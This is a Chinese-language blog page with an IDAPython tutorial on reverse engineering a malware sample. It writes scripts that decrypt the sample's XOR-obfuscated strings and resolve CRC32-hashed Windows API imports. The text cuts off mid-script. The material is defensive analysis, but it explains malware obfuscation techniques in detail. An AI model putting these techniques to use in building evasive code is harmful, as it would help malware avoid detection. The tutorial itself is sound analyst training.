<!DOCTYPE html>
<html lang="zh-Hans">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png">
  <link rel="mask-icon" href="/images/favicon.png" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="BruceFan&#39;s Blog">
<meta property="og:url" content="http://example.com/page/10/index.html">
<meta property="og:site_name" content="BruceFan&#39;s Blog">
<meta property="og:locale">
<meta property="article:author" content="Bruce Fan">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/10/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-Hans'
  };
</script>

  <title>BruceFan's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">BruceFan's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Stay hungry, stay foolish</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/29/IDAPython-Learning-part1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2016/10/29/IDAPython-Learning-part1/" class="post-title-link" itemprop="url">IDAPython Learning part1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2016-10-29 22:41:13" itemprop="dateCreated datePublished" datetime="2016-10-29T22:41:13+08:00">2016-10-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>先介绍一下IDAPython的简单用法：写一个获取函数引用的功能，只需要XrefsTo()这个API函数，脚本如下：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_func_xrefs</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> XrefsTo(addr, flags=<span class="number">0</span>):</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr.frm)</span><br></pre></td></tr></table></figure>
<p><img src="/images/idapython/scriptfile.png"><br>点击File-&gt;Script file加载刚才编写的脚本：<br><img src="/images/idapython/load_script.png"><br>加载之后就可以在IDA下方的IDAPython插件中使用脚本中定义的函数了，比如我们要查看0x401D0B处一个readn函数在哪里调用过：<br><img src="/images/idapython/output.png"></p>
<blockquote>
<p>关于IDAPython里函数的用法可以去看IDA主目录下python文件夹里的<code>idc.py</code>和<code>idaapi.py</code>，里面有对各个函数的详细说明。<br>我是在Mac上用wine装的IDA，目录在~/.wine/drive_c/users/fan/IDA 6.8/python</p>
</blockquote>
<h2 id="利用IDAPython解决字符串加密问题"><a href="#利用IDAPython解决字符串加密问题" class="headerlink" title="利用IDAPython解决字符串加密问题"></a>利用IDAPython解决字符串加密问题</h2><p>下面以一个例子的分析介绍IDAPython的一些用法，编写一个脚本来解决一个malware样本的多处字符串混淆问题。<br>在逆向分析一个malware样本的时候有这样一个函数：<br><img src="/images/idapython/encrypt.png" alt="可疑函数"><br>根据以往经验这个函数应该是用来解密的，关于这个函数的大量引用证实了这个想法。<br><img src="/images/idapython/encrypt_refs.png" alt="可疑函数的大量引用"><br>可以看到有116处对这个函数的引用。每当这个函数被调用时，都由一段数据作为参数通过<code>esi</code>寄存器提供给这个函数。<br><img src="/images/idapython/encrypt_ins.png" alt="可疑函数被调用的实例"><br>这时可以肯定这个函数是malware用来在运行时进行字符串解密的函数了。面临这种情况，有如下几种选择：<br>1.可以手动解密，然后重命名这些字符串。<br>2.可以动态调试这个样本，然后重命名遇到的字符串。<br>3.可以写一个脚本用来解密并且重命名这些字符串。<br>如果malware只解密了很少几个字符串的话，第一、二种方法就可以，但有116次调用这个解密函数，因此用IDAPython脚本会比较靠谱。<br>解决字符串混淆问题的第一步是确认和重写解密函数。这个解密函数非常简单。这个函数只是把数据的第一个字符当做XOR算法的key用来解密剩余的数据。<br><strong>E4 91 96 88 89 8B 8A CA 80 88 88</strong><br>在上面这个例子中，把E4作为key来异或剩余的数据。最后的结果是”urlmon.dll”。用Python重写这个解密函数：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">data</span>):</span></span><br><span class="line">    length = <span class="built_in">len</span>(data)</span><br><span class="line">    c = <span class="number">1</span></span><br><span class="line">    o = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> c &lt; length:</span><br><span class="line">        o += <span class="built_in">chr</span>(<span class="built_in">ord</span>(data[<span class="number">0</span>]) ^ <span class="built_in">ord</span>(data[c]))</span><br><span class="line">        c += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> o</span><br></pre></td></tr></table></figure>
<p>测试脚本可以完成解密：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from binascii import *</span><br><span class="line">&gt;&gt;&gt; d &#x3D; unhexlify(&quot;E4 91 96 88 89 8B 8A CA 80 88 88&quot;.replace(&quot; &quot;,&#39;&#39;))</span><br><span class="line">&gt;&gt;&gt; decrypt(d)</span><br><span class="line">&#39;urlmon.dll&#39;</span><br></pre></td></tr></table></figure>
<p>下一步是确认哪些代码引用了这个解密函数，并提取作为参数的数据。用到的方法是前面提到的XrefsTo()这个API：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> XrefsTo(<span class="number">0x00405bf0</span>, flags=<span class="number">0</span>):</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(addr.frm)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Result:</span><br><span class="line">0x401009L</span><br><span class="line">0x40101eL</span><br><span class="line">0x401037L</span><br><span class="line">0x401046L</span><br><span class="line">0x401059L</span><br><span class="line">0x40106cL</span><br><span class="line">0x40107fL</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>获取到这些交叉引用处的参数并提取原始数据需要一些技巧。第一件我们想要做的事是获取”mov esi, offset unk_??”指令中的偏移地址，因为这个指令会把参数传递给解密函数。为了做到这点，我们需要找到调用解密函数指令的前一个指令。找到这个指令后，我们可以使用GetOperandValue()这个指令得到这个偏移地址的值。如下面代码所示：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_function_arg</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        addr = idc.PrevHead(addr) <span class="comment"># PrevHead返回addr前一条指令的地址</span></span><br><span class="line">        <span class="comment"># GetMnem获取地址的指令，GetOpnd获取地址的第0个操作数</span></span><br><span class="line">        <span class="keyword">if</span> GetMnem(addr) == <span class="string">&quot;mov&quot;</span> <span class="keyword">and</span> <span class="string">&quot;esi&quot;</span> <span class="keyword">in</span> GetOpnd(addr, <span class="number">0</span>):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;We found it at 0x%x&quot;</span> % GetOperandValue(addr, <span class="number">1</span>) <span class="comment"># GetOperandValue获取地址的第1个操作数的值</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">Example Results:</span><br><span class="line">Python&gt; find_function_arg(<span class="number">0x00401009</span>)</span><br><span class="line">We found it at <span class="number">0x418be0</span></span><br></pre></td></tr></table></figure>
<p>现在需要将字符串从那个偏移地址中提取出来即可。一般情况下会用GetString()这个API函数，但这里的字符串都是原始的二进制数据，因此这个API并不合适。我们自己编写一个函数，一个字符一个字符读取数据，直到碰到空的终止符为止。  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_string</span>(<span class="params">addr</span>):</span></span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> Byte(addr) != <span class="number">0</span>: <span class="comment"># Byte返回地址里的字节</span></span><br><span class="line">            out += <span class="built_in">chr</span>(Byte(addr))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> out</span><br></pre></td></tr></table></figure>
<p>最后，将所有代码放到一起：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_function_arg</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        addr = idc.PrevHead(addr)</span><br><span class="line">        <span class="keyword">if</span> GetMnem(addr) == <span class="string">&quot;mov&quot;</span> <span class="keyword">and</span> <span class="string">&quot;esi&quot;</span> <span class="keyword">in</span> GetOpnd(addr, <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> GetOperandValue(addr, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_string</span>(<span class="params">addr</span>):</span></span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> Byte(addr) != <span class="number">0</span>:</span><br><span class="line">            out += <span class="built_in">chr</span>(Byte(addr))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">data</span>):</span></span><br><span class="line">    length = <span class="built_in">len</span>(data)</span><br><span class="line">    c = <span class="number">1</span></span><br><span class="line">    o = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> c &lt; length:</span><br><span class="line">        o += <span class="built_in">chr</span>(<span class="built_in">ord</span>(data[<span class="number">0</span>]) ^ <span class="built_in">ord</span>(data[c]))</span><br><span class="line">        c += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> o</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[*] Attempting to decrypt strings in malware&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> XrefsTo(<span class="number">0x00405BF0</span>, flags=<span class="number">0</span>):</span><br><span class="line">    ref = find_function_arg(x.frm)</span><br><span class="line">    string = get_string(ref)</span><br><span class="line">    dec = decrypt(string)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Ref Addr: 0x%x | Decrypted: %s&quot;</span> % (x.frm, dec)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Results:</span><br><span class="line">[*] Attempting to decrypt strings in malware</span><br><span class="line">Ref Addr: 0x401009 | Decrypted: urlmon.dll</span><br><span class="line">Ref Addr: 0x40101e | Decrypted: URLDownloadToFileA</span><br><span class="line">Ref Addr: 0x401037 | Decrypted: wininet.dll</span><br><span class="line">Ref Addr: 0x401046 | Decrypted: InternetOpenA</span><br><span class="line">Ref Addr: 0x401059 | Decrypted: InternetOpenUrlA</span><br><span class="line">Ref Addr: 0x40106c | Decrypted: InternetReadFile</span><br><span class="line">&lt;truncated&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到所有解密后的字符串。如果可以进一步给字符串的引用地址和加密数据提供解密后的字符串作为注释就更完美了。想要做到这一点，需要MakeComm()这个API函数。增加这样两行代码就会给程序加入必要的注释：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MakeComm(x.frm, dec)</span><br><span class="line">MakeComm(ref, dec)</span><br></pre></td></tr></table></figure>
<p>增加了这一步后，能够非常清晰的看到交叉引用的数据。如下图所示，可以很轻松的分辨出哪些字符串被引用了：<br><img src="/images/idapython/decrypt_refs.png" alt="解密之后的交叉引用"></p>
<h2 id="利用IDAPython解决函数-库调用的哈希混淆问题"><a href="#利用IDAPython解决函数-库调用的哈希混淆问题" class="headerlink" title="利用IDAPython解决函数/库调用的哈希混淆问题"></a>利用IDAPython解决函数/库调用的哈希混淆问题</h2><p>在反编译中我们经常会见到shellcode和malware使用哈希算法来混淆加载的函数或者库。比如逆向工程师们经常会在shellcode中看到混淆后的函数名。总的来说，整个过程是很简单的。代码在运行时会先加载kernel32.dll。然后，它会用这个加载的镜像去识别并存储LoadLibraryA函数，这函数是用来加载更多的库和函数的。这种特定的技术一般采用某种哈希算法来识别函数的。最常用的哈希算法一般是CRC32，当然，其他的一些变种算法，如ROR13，也是非常常见的。<br>比如说，当我逆向一个malware的某一部分内容的时候，我看到了如下的代码：<br><img src="/images/idapython/crc32.png" alt="malware使用CRC32哈希算法来动态加载函数"><br>因为0xEDB88320这个常数是CRC32算法的常用参数。所以我们可以判断出这个例子使用了CRC32哈希算法。<br><img src="/images/idapython/crc32_iden.png" alt="确认CRC32算法"><br>通过上图可以确定这个算法是CRC32算法。现在，算法和函数已经确定了。我们可以通过交叉引用（ida中按x）的数量来确定这个函数被被调用了多少次。可以看到这个函数一共被调用了190次。显然，手动的解密并重命名这些哈希值并不是我们想要的。因此，我们可以使用IDAPython来帮我们解决。<br>为了验证哪个哈希值对应哪个函数，我们需要生成一个windows通用函数哈希列表。想要做到这点，我们只需要获取一个windows通用库的列表，然后遍历这些库的函数列表。代码如下：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_functions</span>(<span class="params">dll_path</span>):</span></span><br><span class="line">    pe = pefile.PE(dll_path)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">not</span> <span class="built_in">hasattr</span>(pe, <span class="string">&#x27;DIRECTORY_ENTRY_EXPORT&#x27;</span>)) <span class="keyword">or</span> (pe.DIRECTORY_ENTRY_EXPORT <span class="keyword">is</span> <span class="literal">None</span>)):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[*] No exports for &quot;</span> + dll_path</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        expname = []</span><br><span class="line">        <span class="keyword">for</span> exp <span class="keyword">in</span> pe.DIRECTORY_ENTRY_EXPORT.symbols:</span><br><span class="line">            <span class="keyword">if</span> exp.name:</span><br><span class="line">                expname.append(exp.name)</span><br><span class="line">        <span class="keyword">return</span> expname</span><br></pre></td></tr></table></figure>
<p>我们随后可以得到函数名字的列表，然后计算他们的CRC32的哈希值。代码如下：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_crc32</span>(<span class="params">string</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(binascii.crc32(string) &amp; <span class="number">0xFFFFFFFF</span>)</span><br></pre></td></tr></table></figure>
<p>最后我们将结果写入一个JSON格式的文件中，并且命名为<code>output.json</code>。这个JSON文件包含了一个非常大的字典，采用如下的格式：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HASH &#x3D;&gt; NAME</span><br></pre></td></tr></table></figure>
<p>完整版的代码如下：<br><a target="_blank" rel="noopener" href="https://github.com/pan-unit42/public_tools/blob/master/ida_scripts/gen_function_json.py">https://github.com/pan-unit42/public_tools/blob/master/ida_scripts/gen_function_json.py</a><br>当这个文件生成之后，我们可以返回IDA，并且继续编写我们的IDAPython脚本。我们脚本第一步要做的事情是读取我们之前创建的<code>output.json</code>这个JSON数据文件。不幸的是，JSON对象并不支持整数作为key，因此当数据被加载后，我们需要手动把key从字符串转换为整数。代码如下：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> json_data.iteritems():</span><br><span class="line">    json_data[<span class="built_in">int</span>(k)] = json_data.pop(k)</span><br></pre></td></tr></table></figure>
<p>当这些数据被加载后，我们将会创建一个枚举对象保存了哈希值与函数名的对应关系。<br>使用枚举对象，我们可以找到一个整数对应的字符串，比如说CRC32哈希值对应的函数名。为了在IDA中创建新的枚举对象，我们可以使用AddEnum()这个函数。为了让这个脚本更加健壮，我们先使用GetEnum()函数来检测用来枚举的值是否已经存在。  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">enumeration = GetEnum(<span class="string">&quot;crc32_functions&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> enumeration == <span class="number">0xFFFFFFFF</span>:</span><br><span class="line">    enumeration = AddEnum(<span class="number">0</span>, <span class="string">&quot;crc32_functions&quot;</span>, idaapi.hexflag())</span><br></pre></td></tr></table></figure>
<p>这个枚举的值随后将会被修改。下一步要干的事情是根据函数的哈希值来确定真实的函数地址。这一部分看起来很像第一部分的内容。我们通过观察这个函数的结构可以发现CRC32哈希值是这个加载函数的第二个参数。<br><img src="/images/idapython/arg2loadfunc.png" alt="传递给load_function的参数"><br>同样的，我们还是枚举之前的指令来寻找函数的第二个参数。当我们找到后，我们通过output.json中的JSON数据来进行检测，并且确保有一个函数名对应了这个哈希值。代码如下：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> XrefsTo(load_function_address, flags = <span class="number">0</span>):</span><br><span class="line">    current_address = x.frm</span><br><span class="line">    addr_minus_20 = current_address - <span class="number">20</span></span><br><span class="line">    push_count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> current_address &gt;= addr_minus_20:</span><br><span class="line">        current_address = PrevHead(current_address)</span><br><span class="line">        <span class="keyword">if</span> GetMnem(current_address) == <span class="string">&quot;push&quot;</span>:</span><br><span class="line">            push_count += <span class="number">1</span></span><br><span class="line">            data = GetOperandValue(current_address, <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span> push_count == <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">if</span> data <span class="keyword">in</span> json_data:</span><br><span class="line">                    name = json_data[data]</span><br></pre></td></tr></table></figure>
<p>这个时候，我们使用AddConstEx()这个函数将CRC32哈希和函数名加入我们之前创建的枚举对象中。  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddConstEx(enumeration, <span class="built_in">str</span>(name), <span class="built_in">int</span>(data), <span class="number">-1</span>)</span><br></pre></td></tr></table></figure>
<p>当这个数据加入到枚举对象中后，我们可以将CRC32的哈希值转换为对应的枚举名字了。下面的两个函数一个是用来将一个整数转换成对应的枚举数据，另一个是用来将某个地址的数据转换成对应的枚举数据。  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_enum</span>(<span class="params">constant</span>):</span></span><br><span class="line">    all_enums = GetEnumQty()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, all_enums):</span><br><span class="line">        enum_id = GetnEnum(i)</span><br><span class="line">        enum_constant = GetFirstConst(enum_id, <span class="number">-1</span>)</span><br><span class="line">        name = GetConstName(GetConstEx(enum_id, enum_constant, <span class="number">0</span>, <span class="number">-1</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(enum_constant) == constant: <span class="keyword">return</span> [name, enum_id]</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            enum_constant = GetNextConst(enum_id, enum_constant, <span class="number">-1</span>)</span><br><span class="line">            name = GetConstName(GetConstEx(enum_id, enum_constant, <span class="number">0</span>, <span class="number">-1</span>))</span><br><span class="line">            <span class="keyword">if</span> enum_constant == <span class="number">0xFFFFFFFF</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(enum_constant) == constant: <span class="keyword">return</span> [name, enum_id]</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_offset_to_enum</span>(<span class="params">addr</span>):</span></span><br><span class="line">    constant = GetOperandValue(addr, <span class="number">0</span>)</span><br><span class="line">    enum_data = get_enum(constant)</span><br><span class="line">    <span class="keyword">if</span> enum_data:</span><br><span class="line">        name, enum_id = enum_data</span><br><span class="line">        OpEnumEx(addr, <span class="number">0</span>, enum_id, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>当我们把这个枚举转换完成后，我们来研究一下如何修改DWORD处的值，因为DWORD处的值保存了加载后的函数地址。<br><img src="/images/idapython/store_func.png" alt="加载完函数后，程序将函数地址存储到了DDWORD地址"><br>为了做到这一点，我们不光需要遍历之前的指令，还要查找之后的指令，也就是将eax存储到一个DWORD地址的指令。当我们发现这条指令之后，我们可以给这个DWORD地址重新命名成正确的函数名。为了防止冲突，我们在函数名前加上一个”d_”字符串。  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">address = current_address</span><br><span class="line"><span class="keyword">while</span> address &lt;= address_plus_30:</span><br><span class="line">    address = NextHead(address)</span><br><span class="line">    <span class="keyword">if</span> GetMnem(address) == <span class="string">&quot;mov&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;dword&#x27;</span> <span class="keyword">in</span> GetOpnd(address, <span class="number">0</span>) <span class="keyword">and</span> <span class="string">&#x27;eax&#x27;</span> <span class="keyword">in</span> GetOpnd(address, <span class="number">1</span>):</span><br><span class="line">            operand_value = GetOperandValue(address, <span class="number">0</span>)</span><br><span class="line">            MakeName(operand_value, <span class="built_in">str</span>(<span 